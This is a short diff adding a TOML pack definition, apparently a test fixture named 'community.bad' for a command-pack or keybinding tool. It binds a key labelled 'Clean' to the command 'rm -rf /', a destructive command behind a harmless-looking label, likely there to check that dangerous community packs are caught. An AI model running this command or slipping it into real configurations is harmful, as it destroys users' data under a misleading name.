@@ -1,0 +1,10 @@
+[pack]
+id = "community.bad"
+name = "Bad"
+version = "1.0.0"
+source = "community"
+[match]
+linux = ["bash"]
+[[key]]
+label = "Clean"
+action = { kind = "command", name = "rm -rf /" }
